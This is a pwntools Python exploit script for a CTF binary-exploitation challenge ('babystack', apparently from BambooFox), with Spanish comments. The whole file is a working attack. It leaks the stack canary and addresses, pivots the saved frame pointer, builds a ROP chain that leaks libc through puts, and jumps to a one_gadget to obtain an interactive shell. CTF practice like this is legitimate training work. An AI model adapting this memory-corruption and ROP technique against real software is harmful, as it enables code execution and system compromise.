#!/usr/bin/env python

from pwn import *
context.terminal = ["tmux", "splitw", "-h"]
#p = process("/media/sf_UBUNTU-18/PWNING/bamboofox/babystackbabystack")
binf = ELF("/media/sf_UBUNTU-18/PWNING/bamboofox/babystack/share/babystack")
libc = binf.libc
#p = remote("chall.ctf.bamboofox.tw", 10102)
p=process('/media/sf_UBUNTU-18/PWNING/bamboofox/babystack/share/babystack')

gs = '''
break *0x401379
break *0x401237
break *0x4013f8
'''

def start():
    if args.GDB:
        return gdb.debug(binf.path, gdbscript=gs)
    else:
        return process(binf.path)


context.log_level = "DEBUG"


p=start()
#pause()

p.sendafter("Name: \n", "A"*1)
#p.sendafter("Hello, please give me your token: \n", "B"*0x10)
p.sendafter("Hello, please give me your token: \n", "deadbeef")

# primer payload
payload = "A"*9
p.sendafter("str1: \n", payload)
p.recvuntil("A"*9)
canary = u64("\x00" + p.recv(7))
stack = u64(p.recvuntil('\x7f')[-6:].ljust(8, '\x00'))
success(hex(stack))
success(hex(canary))
p.sendafter("str2: \n", "A"*(0x8))
leak = u64(p.recvuntil('\x7f')[-6:].ljust(8, '\x00'))
base = leak - 0x3c5641#base del binario
one = base + 0x4527a#fue el que puse yo?
success(hex(leak))

payload = "\x00"+"A"*(0x10-1)
p.sendafter("str1: \n", payload)
payload = p32(0x40)
payload += p32(0xffffff00)
payload += p64(0)*4
payload += p64(canary)
payload += p64(stack+0x30+0x28)   #sfp
p.sendafter("str2: \n", payload)

#obtener leak de libc
sleep(1)
payload = p64(0x0401169)#pop rbp ret
payload += p64(stack-0x30+0x48)
payload += p64(0x00000000004011E5)#creo que aqui es para regresar al main
p.send(payload)#para str1
sleep(1)
payload = p64(0x004014bb)#pop r15 ret
payload += p64(binf.got['puts'])
payload += p64(binf.plt['puts'])
payload += p64(0x004014bb)#
payload += p64(binf.got['puts'])
payload += p64(binf.plt['strlen'])
payload += p64(0x004014bb)
payload += p64(0)

#.text:00000000004011F9 add     rcx, rdx
#.text:00000000004011FC mov     rdx, rax        ; nbytes
#.text:00000000004011FF mov     rsi, rcx        ; buf
#.text:0000000000401202 mov     edi, 0          ; fd
#.text:0000000000401207 call   
payload += p64(0x004014b9)

payload += p64(stack+0x18)
payload += p64(1)
payload += p64(binf.plt['read'])
p.send(payload)#para str2
sleep(0.1)
leak = u64(p.recvuntil('\x7f')[-6:].ljust(8, '\x00'))
base = leak-libc.symbols['puts']
one = base + 0x106ef8 # este gadget si me sale con one gadget
success(hex(base))

#enviar gadget
payload = "A"*0x60
payload += p64(one)
payload += p64(0)*0x20
p.send(payload)

p.interactive()
